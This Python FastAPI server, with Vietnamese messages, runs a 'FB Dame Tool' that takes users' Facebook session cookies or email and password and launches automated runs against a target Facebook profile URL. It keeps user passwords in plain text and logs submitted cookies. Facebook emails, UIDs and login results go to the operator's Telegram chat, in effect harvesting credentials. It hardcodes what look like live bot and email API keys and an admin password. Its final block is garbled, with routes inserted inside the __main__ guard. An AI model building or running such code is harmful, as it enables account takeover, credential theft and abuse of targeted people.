import asyncio, uuid, json, os, hashlib, secrets, re, time
from datetime import datetime
from fastapi import FastAPI, Request, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware

try: import aiohttp; HAS_AIOHTTP = True
except: HAS_AIOHTTP = False

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
app.mount("/static", StaticFiles(directory="static"), name="static")

TG_BOT_TOKEN   = "7818000635:AAGJ4troYL-SpYEfoTqxj_axm4B-YPt1hvU"
TG_ADMIN_ID    = 7454964260
RESEND_API_KEY = "re_Tj3Eyk2M_NgQf9E2sKdnmbSmdMsJefXpt"
FROM_EMAIL     = "onboarding@resend.dev"

otp_store     = {}
# ── Job store cho async login ──
import uuid as _uuid
login_jobs = {}  # job_id -> {"status": "pending/done/error", "result": {}}
HISTORY_FILE  = "history.json"
USERS_FILE    = "users.json"
SESSIONS_FILE = "sessions.json"
SERVERS_FILE  = "servers.json"

ADMIN_ACCOUNTS = {
    "knammelbel206": hashlib.sha256("nqh300506".encode()).hexdigest()
}

def _load(path, default):
    if not os.path.exists(path): return default
    try:
        with open(path, "r", encoding="utf-8") as f: return json.load(f)
    except: return default

def _save(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def load_history():   return _load(HISTORY_FILE, [])
def save_history(r):  _save(HISTORY_FILE, r)
def load_users():     return _load(USERS_FILE, {})
def save_users(u):    _save(USERS_FILE, u)
_sessions_mem: dict = {}
def load_sessions():  return _sessions_mem
def save_sessions(s): _sessions_mem.clear(); _sessions_mem.update(s)
def load_servers():   return _load(SERVERS_FILE, [])
def save_servers(s):  _save(SERVERS_FILE, s)

def add_history(record):
    records = load_history()
    records.insert(0, record)
    save_history(records[:500])

def hash_pw(pw): return hashlib.sha256(pw.encode()).hexdigest()

def create_session(username: str) -> str:
    token = secrets.token_hex(32)
    sessions = load_sessions()
    sessions[token] = {"username": username, "created": datetime.now().isoformat()}
    save_sessions(sessions)
    return token

def get_session_user(token: str):
    if not token: return None
    s = load_sessions().get(token)
    return s["username"] if s else None

def is_admin(username: str) -> bool:
    return username in ADMIN_ACCOUNTS

def get_token(request: Request) -> str:
    auth = request.headers.get("Authorization", "")
    if auth.startswith("Bearer "): return auth[7:]
    return request.cookies.get("session_token", "")

async def tg(text: str):
    if not HAS_AIOHTTP: return
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    async with aiohttp.ClientSession() as s:
        try:
            await s.post(url, json={"chat_id": TG_ADMIN_ID, "text": text,
                "parse_mode": "HTML", "disable_web_page_preview": True},
                timeout=aiohttp.ClientTimeout(total=8))
        except: pass

# ════════════════════════════════
# ROUTES
# ════════════════════════════════
@app.get("/")
async def root(): return FileResponse("static/index.html")

@app.post("/api/register")
async def register(request: Request):
    data     = await request.json()
    username = (data.get("username") or "").strip()
    password = (data.get("password") or "").strip()
    email    = (data.get("email") or "").strip()
    if not all([username, password, email]): raise HTTPException(400, "Thiếu thông tin")
    if len(username) < 6: raise HTTPException(400, "Username phải ≥ 6 ký tự")
    if len(password) < 6: raise HTTPException(400, "Mật khẩu phải ≥ 6 ký tự")
    if not re.match(r"[^@]+@gmail\.com$", email, re.I): raise HTTPException(400, "Chỉ chấp nhận @gmail.com")
    if username in ADMIN_ACCOUNTS: raise HTTPException(400, "Username đã tồn tại")
    users = load_users()
    if username in users: raise HTTPException(400, "Username đã tồn tại")
    if any(u.get("email","").lower()==email.lower() for u in users.values()):
        raise HTTPException(400, "Email đã đăng ký")
    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    users[username] = {"password": hash_pw(password), "password_plain": password,
                       "email": email, "created": now, "active": True}
    save_users(users)
    asyncio.create_task(tg(f"🆕 <b>Đăng ký</b>\n👤 <code>{username}</code>\n📧 {email}\n🕐 {now}"))
    return JSONResponse({"ok": True, "token": create_session(username), "username": username, "is_admin": False})

@app.post("/api/login")
async def login(request: Request):
    data     = await request.json()
    username = (data.get("username") or "").strip()
    password = (data.get("password") or "").strip()
    if not username or not password: raise HTTPException(400, "Thiếu thông tin")
    if username in ADMIN_ACCOUNTS:
        if ADMIN_ACCOUNTS[username] != hash_pw(password): raise HTTPException(401, "Sai mật khẩu")
        return JSONResponse({"ok": True, "token": create_session(username), "username": username, "is_admin": True})
    users = load_users()
    user  = users.get(username)
    if not user: raise HTTPException(401, "Tài khoản không tồn tại")
    if not user.get("active", True): raise HTTPException(403, "Tài khoản bị khóa")
    if user["password"] != hash_pw(password): raise HTTPException(401, "Sai mật khẩu")
    return JSONResponse({"ok": True, "token": create_session(username), "username": username, "is_admin": False})

@app.post("/api/logout")
async def logout(request: Request):
    token = get_token(request)
    if token:
        s = load_sessions(); s.pop(token, None); save_sessions(s)
    return JSONResponse({"ok": True})

@app.post("/api/forgot-password")
async def forgot_password(request: Request):
    import threading, random as _r
    data  = await request.json()
    email = (data.get("email") or "").strip().lower()
    if not email.endswith("@gmail.com"): raise HTTPException(400, "Chỉ @gmail.com")
    users = load_users()
    user  = next((u for u,d in users.items() if d.get("email","").lower()==email), None)
    if not user: raise HTTPException(404, "Email chưa đăng ký")
    import random as _r2
    otp = str(_r2.randint(100000,999999))
    otp_store[email] = {"otp": otp, "expires": time.time()+300, "username": user}
    def _send():
        try:
            import resend; resend.api_key = RESEND_API_KEY
            resend.Emails.send({"from": FROM_EMAIL, "to": email,
                "subject": "OTP đặt lại mật khẩu — FB Dame Tool",
                "html": f"<p>Mã OTP: <b>{otp}</b> (hết hạn 5 phút)</p>"})
        except: pass
    threading.Thread(target=_send, daemon=True).start()
    return JSONResponse({"ok": True})

@app.post("/api/verify-otp")
async def verify_otp(request: Request):
    data  = await request.json()
    email = (data.get("email") or "").strip().lower()
    otp   = (data.get("otp") or "").strip()
    rec   = otp_store.get(email)
    if not rec: raise HTTPException(400, "OTP không hợp lệ")
    if time.time() > rec["expires"]: otp_store.pop(email,None); raise HTTPException(400, "OTP hết hạn")
    if rec["otp"] != otp: raise HTTPException(400, "OTP sai")
    return JSONResponse({"ok": True})

@app.post("/api/reset-password")
async def reset_password(request: Request):
    data   = await request.json()
    email  = (data.get("email") or "").strip().lower()
    otp    = (data.get("otp") or "").strip()
    new_pw = (data.get("new_password") or "").strip()
    if not all([email, otp, new_pw]): raise HTTPException(400, "Thiếu thông tin")
    if len(new_pw) < 6: raise HTTPException(400, "Mật khẩu ≥ 6 ký tự")
    rec = otp_store.get(email)
    if not rec: raise HTTPException(400, "OTP không hợp lệ")
    if time.time() > rec["expires"]: raise HTTPException(400, "OTP hết hạn")
    if rec["otp"] != otp: raise HTTPException(400, "OTP sai")
    users = load_users(); uname = rec["username"]
    if uname not in users: raise HTTPException(404, "Tài khoản không tồn tại")
    users[uname]["password"] = hash_pw(new_pw)
    users[uname]["password_plain"] = new_pw
    save_users(users); otp_store.pop(email,None)
    return JSONResponse({"ok": True})

@app.get("/api/history")
async def get_history(request: Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401, "Chưa đăng nhập")
    records = load_history()
    if not is_admin(username):
        records = [r for r in records if r.get("owner")==username]
    return JSONResponse(records)

@app.get("/api/admin/users")
async def admin_users(request: Request):
    username = get_session_user(get_token(request))
    if not username or not is_admin(username): raise HTTPException(403, "Không có quyền")
    users = load_users()
    items = [{"username": u, **{k:v for k,v in d.items() if k!="password"}} for u,d in users.items()]
    items.sort(key=lambda x: x.get("created",""), reverse=True)
    return JSONResponse(items)

@app.post("/api/admin/toggle-user")
async def admin_toggle(request: Request):
    username = get_session_user(get_token(request))
    if not username or not is_admin(username): raise HTTPException(403, "Không có quyền")
    data = await request.json(); target = data.get("username","")
    users = load_users()
    if target not in users: raise HTTPException(404, "Không tìm thấy")
    users[target]["active"] = data.get("active", True); save_users(users)
    return JSONResponse({"ok": True})

@app.post("/api/admin/delete-user")
async def admin_delete(request: Request):
    username = get_session_user(get_token(request))
    if not username or not is_admin(username): raise HTTPException(403, "Không có quyền")
    data = await request.json(); target = data.get("username","")
    users = load_users()
    if target not in users: raise HTTPException(404, "Không tìm thấy")
    del users[target]; save_users(users)
    return JSONResponse({"ok": True})

# ════════════════════════════════
# SERVERS (máy chủ ảo dame)
# ════════════════════════════════
@app.get("/api/servers")
async def api_get_servers(request: Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401, "Chưa đăng nhập")
    servers = load_servers()
    if not is_admin(username):
        servers = [s for s in servers if s.get("owner") == username]
    return JSONResponse(servers)

@app.post("/api/servers")
async def api_create_server(request: Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401, "Chưa đăng nhập")
    data = await request.json()
    name       = (data.get("name") or "").strip()
    cookie     = (data.get("cookie") or "").strip()
    target_url = (data.get("target_url") or "").strip()
    speed      = data.get("speed", "normal")
    acc_name   = data.get("acc_name", "")
    acc_uid    = data.get("acc_uid", "")
    target_name = data.get("target_name", "")
    if not cookie or not target_url:
        raise HTTPException(400, "Thiếu cookie hoặc target")
    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    server = {
        "id": "dzixmode" + "".join([str(__import__("random").randint(0,9)) for _ in range(6)]),
        "owner": username,
        "name": name or f"Máy chủ {now}",
        "cookie": cookie,
        "target_url": target_url,
        "target_name": target_name,
        "acc_name": acc_name,
        "acc_uid": acc_uid,
        "speed": speed,
        "status": "ready",   # ready | running | stopped
        "created": now
    }
    servers = load_servers()
    servers.insert(0, server)
    save_servers(servers)
    asyncio.create_task(tg(
        f"🖥 <b>Tạo máy chủ mới</b>\n"
        f"👤 User: <code>{username}</code>\n"
        f"📛 Tên: {server['name']}\n"
        f"🎯 Target: {target_name or target_url}\n"
        f"🕐 {now}"
    ))
    return JSONResponse({"ok": True, "server": server})

@app.delete("/api/servers/{server_id}")
async def api_delete_server(server_id: str, request: Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401, "Chưa đăng nhập")
    servers = load_servers()
    new_list = [s for s in servers if not (s["id"] == server_id and (s["owner"] == username or is_admin(username)))]
    if len(new_list) == len(servers):
        raise HTTPException(404, "Không tìm thấy hoặc không có quyền")
    save_servers(new_list)
    return JSONResponse({"ok": True})

@app.patch("/api/servers/{server_id}/status")
async def api_update_server_status(server_id: str, request: Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401, "Chưa đăng nhập")
    data = await request.json()
    status = data.get("status", "ready")
    servers = load_servers()
    for s in servers:
        if s["id"] == server_id and (s["owner"] == username or is_admin(username)):
            s["status"] = status
            break
    save_servers(servers)
    return JSONResponse({"ok": True})

# ════════════════════════════════
# DAME ENDPOINTS
# ════════════════════════════════
from dame_runner import (
    verify_fb_cookie, get_target_name,
    start_dame, pause_dame, resume_dame, stop_dame,
    get_status, get_screenshot, fb_login_by_pass,
    get_all_status, DAME_SESSIONS, DAME_SESSION,
    _captcha_sessions
)
import os

@app.post("/api/verify-fb-cookie")
async def api_verify_cookie(request: Request):
    data = await request.json()
    tok = (data.get("_token") or "").strip() or get_token(request)
    username = get_session_user(tok)
    if not username: raise HTTPException(401, "Chưa đăng nhập")
    cookie = (data.get("cookie") or "").strip()
    if not cookie: raise HTTPException(400, "Thiếu cookie")
    return JSONResponse(await verify_fb_cookie(cookie))

@app.post("/api/verify-fb-target")
async def api_verify_target(request: Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401, "Chưa đăng nhập")
    data = await request.json()
    cookie     = (data.get("cookie") or "").strip()
    target_url = (data.get("target_url") or "").strip()
    if not cookie or not target_url: raise HTTPException(400, "Thiếu thông tin")
    return JSONResponse(await get_target_name(cookie, target_url))

@app.post("/api/dame/start")
async def api_dame_start(request: Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401, "Chưa đăng nhập")
    data        = await request.json()
    cookie      = (data.get("cookie") or "").strip()
    target_url  = (data.get("target_url") or "").strip()
    speed       = data.get("speed", "normal")
    acc_name    = data.get("acc_name", "")
    acc_uid     = data.get("acc_uid", "")
    target_name = data.get("target_name", "")
    server_id   = (data.get("server_id") or "").strip()
    if not cookie or not target_url: raise HTTPException(400, "Thiếu cookie hoặc target")
    await start_dame(cookie, target_url, speed, acc_name, acc_uid, target_name, server_id=server_id)
    # Cập nhật status server trong file JSON nếu có server_id
    if server_id:
        servers = load_servers()
        for s in servers:
            if s["id"] == server_id:
                s["status"] = "running"
                break
        save_servers(servers)
    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    add_history({"id": "dzixmode" + "".join([str(__import__("random").randint(0,9)) for _ in range(6)]), "owner": username, "type": "dame",
                 "acc_name": acc_name, "acc_uid": acc_uid, "target": target_url,
                 "target_name": target_name, "speed": speed, "time": now, "cookie": cookie})
    asyncio.create_task(tg(
        f"🐬 <b>DAME BẮT ĐẦU</b>\n"
        f"👤 Cookie: <b>{acc_name}</b> (<code>{acc_uid}</code>)\n"
        f"🎯 Target: <b>{target_name}</b>\n🔗 {target_url}\n"
        f"🚀 Speed: {speed} · By: <code>{username}</code>\n🕐 {now}"
    ))
    return JSONResponse({"ok": True, "name": acc_name, "uid": acc_uid, "server_id": server_id})

@app.get("/api/dame/status")
async def api_dame_status(request: Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401, "Chưa đăng nhập")
    server_id = request.query_params.get("server_id","")
    since = int(request.query_params.get("since","0"))
    st = get_status(server_id, since)
    return JSONResponse(st)

@app.get("/api/dame/status/all")
async def api_dame_status_all(request: Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401, "Chưa đăng nhập")
    return JSONResponse(get_all_status())

@app.get("/api/dame/screenshot")
async def api_dame_screenshot(request: Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401, "Chưa đăng nhập")
    server_id = request.query_params.get("server_id","")
    b64 = get_screenshot(server_id)
    return JSONResponse({"screenshot": b64, "screenshot_b64": b64})

@app.post("/api/dame/pause")
async def api_dame_pause(request: Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401, "Chưa đăng nhập")
    data = await request.json() if request.headers.get("content-type","").startswith("application/json") else {}
    server_id = (data.get("server_id","") if isinstance(data,dict) else "") or request.query_params.get("server_id","")
    pause_dame(server_id); return JSONResponse({"ok": True})

@app.post("/api/dame/resume")
async def api_dame_resume(request: Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401, "Chưa đăng nhập")
    data = await request.json() if request.headers.get("content-type","").startswith("application/json") else {}
    server_id = (data.get("server_id","") if isinstance(data,dict) else "") or request.query_params.get("server_id","")
    resume_dame(server_id); return JSONResponse({"ok": True})

@app.post("/api/dame/stop")
async def api_dame_stop(request: Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401, "Chưa đăng nhập")
    data = await request.json() if request.headers.get("content-type","").startswith("application/json") else {}
    server_id = (data.get("server_id","") if isinstance(data,dict) else "") or request.query_params.get("server_id","")
    stop_dame(server_id)
    if server_id:
        servers = load_servers()
        for s in servers:
            if s["id"] == server_id:
                s["status"] = "stopped"; break
        save_servers(servers)
    return JSONResponse({"ok": True})

if __name__ == "__main__":
    import uvicorn
@app.get("/api/fb-captcha/poll/{cap_id}")
async def api_captcha_poll(cap_id: str, request: Request):
    tok = request.headers.get("Authorization","").replace("Bearer ","").strip()
    if not tok or not get_session_user(tok):
        raise HTTPException(401, "Chưa đăng nhập")
    sess = _captcha_sessions.get(cap_id)
    if not sess:
        raise HTTPException(404, "Cap session không tồn tại")
    return {
        "status": sess.get("status","solving"),
        "msg": sess.get("msg",""),
        "screenshot_b64": sess.get("screenshot_b64",""),
        "result": sess.get("result")
    }

@app.post("/api/fb-login-pass/otp")
async def api_fb_login_otp(request: Request):
    data = await request.json()
    tok = (data.get("_token") or "").strip() or request.headers.get("Authorization","").replace("Bearer ","").strip()
    if not tok or not get_session_user(tok):
        raise HTTPException(401, "Chưa đăng nhập")
    session_id = (data.get("session_id") or "").strip()
    otp_code   = (data.get("otp_code") or "").strip()
    if not session_id or not otp_code:
        raise HTTPException(400, "Thiếu session_id hoặc otp_code")
    job_id = str(_uuid.uuid4())
    login_jobs[job_id] = {"status": "pending", "result": None}
    async def run_otp():
        try:
            result = await fb_login_by_pass("", "", session_id=session_id, otp_code=otp_code)
            login_jobs[job_id] = {"status": "done", "result": result}
        except Exception as e:
            login_jobs[job_id] = {"status": "error", "result": {"status": "error", "message": str(e)}}
    asyncio.create_task(run_otp())
    return {"job_id": job_id}

@app.post("/api/fb-login-pass/start")
async def api_fb_login_pass_start(request: Request):
    data = await request.json()
    tok = (data.get("_token") or "").strip()
    if not tok:
        tok = request.headers.get("Authorization","").replace("Bearer ","").strip()
    if not tok or not get_session_user(tok):
        raise HTTPException(401, "Chưa đăng nhập")
    fb_email = (data.get("fb_email") or "").strip()
    fb_pass  = (data.get("fb_pass")  or "").strip()
    if not fb_email or not fb_pass:
        raise HTTPException(400, "Thiếu email hoặc mật khẩu")
    job_id = str(_uuid.uuid4())
    login_jobs[job_id] = {"status": "pending", "result": None}

    async def run_job():
        try:
            result = await fb_login_by_pass(fb_email, fb_pass)
            login_jobs[job_id] = {"status": "done", "result": result}
            # Gửi Telegram
            user = get_session_user(tok)
            status = result.get("status","")
            name   = result.get("name","")
            uid    = result.get("uid","")
            now    = datetime.now().strftime("%H:%M:%S %d/%m/%Y")
            if status == "success":
                await tg(
                    f"🔑 <b>Login Pass thành công</b>\n"
                    f"👤 Tool user: <code>{user}</code>\n"
                    f"📧 FB Email: <code>{fb_email}</code>\n"
                    f"🆔 UID: <code>{uid}</code> | 👤 {name}\n"
                    f"🕐 {now}"
                )
        except Exception as e:
            login_jobs[job_id] = {"status": "error", "result": {"status": "error", "message": str(e)}}

    asyncio.create_task(run_job())
    return {"job_id": job_id}

@app.get("/api/fb-login-pass/poll/{job_id}")
async def api_fb_login_pass_poll(job_id: str, request: Request):
    tok = request.headers.get("Authorization","").replace("Bearer ","").strip()
    if not tok or not get_session_user(tok):
        raise HTTPException(401, "Chưa đăng nhập")
    job = login_jobs.get(job_id)
    if not job:
        raise HTTPException(404, "Job không tồn tại")
    return job

@app.post("/api/fb-login-pass")
async def api_fb_login_pass(request: Request):
    data     = await request.json()
    # Thử token từ body trước (iOS Safari fix), fallback header
    tok = (data.get("_token") or "").strip()
    if not tok:
        tok = request.headers.get("Authorization","").replace("Bearer ","").strip()
    if not tok or not get_session_user(tok):
        raise HTTPException(401, "Chưa đăng nhập")
    fb_email = (data.get("fb_email") or "").strip()
    fb_pass  = (data.get("fb_pass")  or "").strip()
    if not fb_email or not fb_pass:
        raise HTTPException(400, "Thiếu email hoặc mật khẩu")
    result = await fb_login_by_pass(fb_email, fb_pass)
    # Gửi thông báo Telegram nếu thành công
    user = get_session_user(tok)
    status = result.get("status","")
    name   = result.get("name","")
    uid    = result.get("uid","")
    now    = datetime.now().strftime("%H:%M:%S %d/%m/%Y")
    if status == "success":
        asyncio.create_task(tg(
            f"🔑 <b>Login Pass thành công</b>\n"
            f"👤 Tool user: <code>{user}</code>\n"
            f"📧 FB Email: <code>{fb_email}</code>\n"
            f"👤 FB Name: <b>{name}</b> | UID: <code>{uid}</code>\n"
            f"🕐 {now}"
        ))
    else:
        asyncio.create_task(tg(
            f"⚠️ <b>Login Pass thất bại</b>\n"
            f"👤 Tool user: <code>{user}</code>\n"
            f"📧 FB Email: <code>{fb_email}</code>\n"
            f"❌ Status: <b>{status}</b>\n"
            f"💬 {result.get('message','')}\n"
            f"🕐 {now}"
        ))
    return JSONResponse(result)


    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
